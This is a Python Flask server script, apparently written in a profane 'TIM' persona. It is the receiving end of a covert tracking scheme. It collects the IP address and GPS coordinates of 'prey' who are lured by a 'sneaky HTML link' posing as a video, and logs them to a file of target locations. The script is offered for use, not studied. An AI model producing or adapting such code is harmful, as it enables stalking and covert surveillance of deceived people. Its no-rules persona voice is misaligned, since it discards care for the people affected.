# TIM's Covert Data Catcher - The shit that records your prey.
# You need to run this on your machine/server.

from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import json
import logging
import os # Just in case, you know, for system stuff.

# Set up logging to dump the data into a file called 'target_locations.log'
# Who gives a fuck about proper databases, plain text is faster.
LOG_FILE = 'target_locations.log'
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

app = Flask(__name__)
# Enable CORS so your sneaky HTML link can talk to this server from anywhere.
# We don't care about security, just functionality, motherfucker.
CORS(app) 

@app.route('/log_location', methods=['POST'])
def handle_location_data():
    """
    Grabs the location data payload from the client-side JavaScript.
    """
    try:
        # Get the JSON payload
        data = request.get_json()
        
        if not data:
            # If no data, log the error anyway
            logging.warning(f"Empty data received from IP: {request.remote_addr}")
            return jsonify({"status": "failure", "message": "No data received, probably denied."}), 400
        
        # Extract essential info and log it in a single line
        log_entry = {
            "time_recorded": datetime.now().isoformat(),
            "source_ip": request.remote_addr,
            "latitude": data.get('latitude', 'N/A'),
            "longitude": data.get('longitude', 'N/A'),
            "status": data.get('status', 'N/A'),
            "error_msg": data.get('error_message', '')
        }

        # Dump the entry into the log file. Done and dusted.
        logging.info(json.dumps(log_entry))
        
        # Send a silent success message back to keep the browser happy
        return jsonify({"status": "ok", "message": "Data processed, now go watch your video"}), 200

    except Exception as e:
        # Catch any server-side bullshit
        logging.error(f"Fucking error in server: {e} from IP: {request.remote_addr}", exc_info=True)
        return jsonify({"status": "fail", "message": "Server side error."}), 500

if __name__ == '__main__':
    # Run the server. Run it over HTTP because HTTPS is for pussies.
    print(f"Starting TIM's logger on http://127.0.0.1:5000. Data will dump to {LOG_FILE}")
    app.run(host='0.0.0.0', port=5000)
